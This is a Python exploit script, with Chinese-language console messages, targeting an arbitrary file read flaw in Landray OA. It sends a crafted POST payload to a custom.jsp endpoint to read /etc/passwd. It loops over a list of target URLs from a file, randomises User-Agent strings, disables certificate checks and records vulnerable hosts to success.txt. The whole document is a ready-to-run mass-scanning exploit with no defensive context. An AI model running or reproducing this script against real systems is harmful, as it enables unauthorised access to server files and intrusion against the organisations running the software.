#!/usr/bin/python3     
#-*- coding:utf-8 -*-  
                       
import base64          
import requests        
import random          
import re              
import json            
import sys             
from requests.packages.urllib3.exceptions import InsecureRequestWarning
                       
def title():           
    print('+------------------------------------------')
    print('+  \033[34mVersion:    蓝凌OA 任意文件读取漏洞                                          \033[0m')
    print('+  \033[36m使用格式:   python3 poc.py                                            \033[0m')
    print('+  \033[36m文件名:     url.txt                                                   \033[0m')
    print('+------------------------------------------')
                       
def get_ua():          
    first_num = random.randint(55, 62)
    third_num = random.randint(0, 3200)
    fourth_num = random.randint(0, 140)
    os_type = [        
        '(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
        '(Macintosh; Intel Mac OS X 10_12_6)'
    ]                  
    chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)
                       
    ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
                   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
                  )    
    return ua          
                       
                       
def POC_1(target_url): 
    vuln_url = target_url + "/sys/ui/extend/varkind/custom.jsp"
    headers = {        
                "User-Agent": get_ua(),
                "Content-Type": "application/x-www-form-urlencoded"
    }                  
    data = 'var={"body":{"file":"file:///etc/passwd"}}'
    try:               
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10)
        print("\033[36m[+] 正在请求 {}/sys/ui/extend/varkind/custom.jsp \033[0m".format(target_url))
        if "root:" in response.text and response.status_code == 200:
            with open('success.txt', 'a', encoding='utf8') as vul:
                vul.write("{}\n".format(target_url))
            print("\033[36m[+] 成功读取 /etc/passwd文件\n\033[0m")
    except Exception as e:
        print("\033[31m[x] 请求失败: {} \033[0m".format(e))
                       
def Scan(file_name):   
    header={"User-Agent": get_ua(),}
    with open(file_name, "r", encoding='utf8') as scan_url:
        for url in scan_url:
            if url[:4] != "http":
                url = "http://" + url
                url = url.strip('\n')
            try:       
                requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                httpError = False
                try:   
                    req = requests.get(url=url, headers=header, verify=False, timeout=10)
                except Exception as e:
                    httpError = True
                if not httpError and req.status_code == 200:
                    print("\033[32m[+] 正在请求 {}".format(url))
                else:  
                    url = url.replace("http","https")
                    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                    req = requests.get(url=url, headers=header, verify=False, timeout=10)
                    if req.status_code == 200:
                        print("\033[32m[+] 正在请求 {}".format(url))
                    else:
                        pass
            except Exception as e:
                print("\033[31m[x] "+url+" 访问失败 \033[0m".format(e))
            else:      
                pass   
            try:       
                POC_1(url)
                       
            except Exception as e:
                print("\033[31m[x] "+url+"请求报错 \033[0m".format(e))
                continue
                       
                       
if __name__ == '__main__':
    title()            
    file_name = str(input("\033[35m请输入需要检测的文件名：\033[0m"))
    Scan(file_name)    
                       
